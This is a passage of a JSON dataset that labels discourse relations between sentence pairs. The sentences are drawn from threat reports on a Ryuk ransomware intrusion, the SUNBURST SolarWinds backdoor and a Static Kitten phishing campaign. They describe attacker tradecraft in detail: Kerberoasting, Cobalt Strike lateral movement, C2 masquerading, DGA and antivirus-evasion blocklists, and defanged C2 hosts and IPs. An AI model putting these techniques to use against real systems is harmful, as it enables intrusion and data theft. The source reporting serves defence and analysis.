    },
    {
        "S1": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
        "S2": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "S2": "The batch file outputs information into the following text files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The batch file outputs information into the following text files.",
        "S2": "Nltest was used to check for Domain trusts",
        "relation": "NEXT"
    },
    {
        "S1": "Nltest was used to check for Domain trusts",
        "S2": "Net was used to show Domain Admins",
        "relation": "NEXT"
    },
    {
        "S1": "Net was used to show Domain Admins",
        "S2": "Ping was used to test if systems were up in the environment",
        "relation": "NEXT"
    },
    {
        "S1": "Ping was used to test if systems were up in the environment",
        "S2": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.",
        "relation": "NEXT"
    },
    {
        "S1": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.",
        "S2": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.",
        "relation": "NEXT"
    },
    {
        "S1": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.",
        "S2": "WMI was used to check for the current AntiVirus on numerous systems",
        "relation": "NEXT"
    },
    {
        "S1": "WMI was used to check for the current AntiVirus on numerous systems",
        "S2": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "relation": "NEXT"
    },
    {
        "S1": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "S2": "The system was not vulnerable to MS17-010",
        "relation": "ELABORATION"
    },
    {
        "S1": "The system was not vulnerable to MS17-010",
        "S2": "Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller.",
        "S2": "From there, the threat actor used WMIC to execute the beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "From there, the threat actor used WMIC to execute the beacon.",
        "S2": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "relation": "NEXT"
    },
    {
        "S1": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "S2": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
        "S2": "At this point, C2 connections appear on the domain controller connecting to martahzz[.]com \u2013 88.119.171[.]75 over 443/https.",
        "relation": "NEXT"
    },
    {
        "S1": "At this point, C2 connections appear on the domain controller connecting to martahzz[.]com \u2013 88.119.171[.]75 over 443/https.",
        "S2": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.",
        "S2": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "S2": "Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.",
        "relation": "NEXT"
    },
    {
        "S1": "Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.",
        "S2": "SMB was used to transfer the Ryuk executables.",
        "relation": "NEXT"
    },
    {
        "S1": "SMB was used to transfer the Ryuk executables.",
        "S2": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
        "relation": "NEXT"
    },
    {
        "S1": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
        "S2": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "relation": "NEXT"
    },
    {
        "S1": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "S2": "Commands ran prior to ransom execution",
        "relation": "NEXT"
    },
    {
        "S1": "Commands ran prior to ransom execution",
        "S2": "All systems were left with the following ransom note:",
        "relation": "NEXT"
    },
    {
        "S1": "All systems were left with the following ransom note:",
        "S2": "The threat actors asked for more than $6 million but were willing to negotiate.",
        "relation": "NEXT"
    },
    {
        "S1": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.",
        "S2": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "S2": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "S2": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "relation": "MISC"
    },
    {
        "S1": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "S2": "Post compromise activity following this supply chain compromise has included lateral movement and data theft.",
        "relation": "MISC"
    },
    {
        "S1": "Post compromise activity following this supply chain compromise has included lateral movement and data theft.",
        "S2": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "relation": "MISC"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "S2": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "S2": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services.",
        "S2": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "S2": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "S2": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "relation": "MISC"
    },
    {
        "S1": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "S2": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "S2": "Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).",
        "relation": "NEXT"
    },
    {
        "S1": "Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).",
        "S2": "After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.",
        "relation": "NEXT"
    },
    {
        "S1": "After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.",
        "S2": "The DNS response will return a CNAME record that points to a Command and Control (C2) domain.",
        "relation": "NEXT"
    },
    {
        "S1": "The DNS response will return a CNAME record that points to a Command and Control (C2) domain.",
        "S2": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "S2": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "relation": "MISC"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer and execute files, profile the system, and disable system services.",
        "relation": "NEXT"
    },
    {
        "S1": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer and execute files, profile the system, and disable system services.",
        "S2": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "S2": "The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers.",
        "S2": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims",
        "relation": "MISC"
    },
    {
        "S1": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims",
        "S2": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "relation": "LIST"
    },
    {
        "S1": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "S2": "- Code hides in plain site by using fake variable names and tying into legitimate components",
        "relation": "LIST"
    },
    {
        "S1": "- Code hides in plain site by using fake variable names and tying into legitimate components",
        "S2": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "relation": "MISC"
    },
    {
        "S1": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "S2": "The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report.",
        "S2": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "S2": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "S2": "Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor.",
        "S2": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "S2": "The file was signed on March 24, 2020.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The file was signed on March 24, 2020.",
        "S2": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "relation": "MISC"
    },
    {
        "S1": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "S2": "This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\".",
        "S2": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "S2": "The sample continues to check this time threshold as it is run by a legitimate recurring background task.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample continues to check this time threshold as it is run by a legitimate recurring background task.",
        "S2": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "S2": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "S2": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "S2": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "relation": "MISC"
    },
    {
        "S1": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "S2": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "relation": "NEXT"
    },
    {
        "S1": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "S2": "The userID is encoded via a custom XOR scheme after the MD5 is calculated.",
        "relation": "NEXT"
    },
    {
        "S1": "The userID is encoded via a custom XOR scheme after the MD5 is calculated.",
        "S2": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "relation": "NEXT"
    },
    {
        "S1": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "S2": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "relation": "NEXT"
    },
    {
        "S1": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "S2": "The sample then invokes the method Update which is the core event loop of the sample.",
        "relation": "NEXT"
    },
    {
        "S1": "The sample then invokes the method Update which is the core event loop of the sample.",
        "S2": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "S2": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "S2": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "S2": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "S2": "These subdomains are concatenated with one of the following to create the hostname to resolve:",
        "relation": "ELABORATION"
    },
    {
        "S1": "These subdomains are concatenated with one of the following to create the hostname to resolve:",
        "S2": "Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists.",
        "S2": "Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components.",
        "S2": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "S2": "Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled.",
        "relation": "NEXT"
    },
    {
        "S1": "Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled.",
        "S2": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "S2": "The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples\u2019 config file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples\u2019 config file.",
        "S2": "If any service was transitioned to disabled the Update method exits and retries later.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If any service was transitioned to disabled the Update method exits and retries later.",
        "S2": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "relation": "NEXT"
    },
    {
        "S1": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "S2": "If any blocklisted driver is seen the Update method exits and retries.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If any blocklisted driver is seen the Update method exits and retries.",
        "S2": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "S2": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "S2": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "S2": "The DNS",
        "relation": "MISC"
    },
    {
        "S1": "The DNS",
        "S2": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "relation": "MISC"
    },
    {
        "S1": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "S2": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:",
        "relation": "NEXT"
    },
    {
        "S1": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:",
        "S2": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "relation": "NEXT"
    },
    {
        "S1": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "S2": "The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command.",
        "relation": "NEXT"
    },
    {
        "S1": "The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command.",
        "S2": "The HTTP thread will delay for a minimum of 1 minute between callouts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The HTTP thread will delay for a minimum of 1 minute between callouts.",
        "S2": "The malware uses HTTP GET or HTTP POST requests.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware uses HTTP GET or HTTP POST requests.",
        "S2": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".",
        "S2": "A JSON payload is present for all HTTP POST and PUT requests and contains the keys \u201cuserId\u201d, \u201csessionId\u201d, and \u201csteps\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A JSON payload is present for all HTTP POST and PUT requests and contains the keys \u201cuserId\u201d, \u201csessionId\u201d, and \u201csteps\u201d.",
        "S2": "The \u201csteps\u201d field contains a list of objects with the following keys: \u201cTimestamp\u201d, \u201cIndex\u201d, \u201cEventType\u201d, \u201cEventName\u201d, \u201cDurationMs\u201d, \u201cSucceeded\u201d, and \u201cMessage\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The \u201csteps\u201d field contains a list of objects with the following keys: \u201cTimestamp\u201d, \u201cIndex\u201d, \u201cEventType\u201d, \u201cEventName\u201d, \u201cDurationMs\u201d, \u201cSucceeded\u201d, and \u201cMessage\u201d.",
        "S2": "The JSON key \u201cEventType\u201d is hardcoded to the value \u201cOrion\u201d, and the \u201cEventName\u201d is hardcoded to \u201cEventManager\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The JSON key \u201cEventType\u201d is hardcoded to the value \u201cOrion\u201d, and the \u201cEventName\u201d is hardcoded to \u201cEventManager\u201d.",
        "S2": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "S2": "Each \u201cMessage\u201d value is Base64 encoded separately.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each \u201cMessage\u201d value is Base64 encoded separately.",
        "S2": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "relation": "MISC"
    },
    {
        "S1": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "S2": "Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response.",
        "S2": "In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present.",
        "relation": "MISC"
    },
    {
        "S1": "In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present.",
        "S2": "Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\".",
        "relation": "NEXT"
    },
    {
        "S1": "Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\".",
        "S2": "Command data is spread across multiple strings that are disguised as GUID and HEX strings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Command data is spread across multiple strings that are disguised as GUID and HEX strings.",
        "S2": "All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded.",
        "S2": "The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following.",
        "S2": "The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed.",
        "S2": "The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters.",
        "S2": "Commands are then dispatched to a JobExecutionEngine based upon the command value as described next.",
        "relation": "NEXT"
    },
    {
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "The URLs distributed through these phishing emails direct recipients to the intended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6]",
        "relation": "NEXT"
    },
    {
        "S1": "The URLs distributed through these phishing emails direct recipients to the intended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6]",
        "S2": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "The delivery URLs found to be part of this campaign are:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The delivery URLs found to be part of this campaign are:",
        "S2": "File names in this campaign include:",
        "relation": "ELABORATION"
    },
    {
        "S1": "File names in this campaign include:",
        "S2": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "relation": "MISC"
    },
    {
        "S1": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "S2": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "relation": "NEXT"
    },
    {
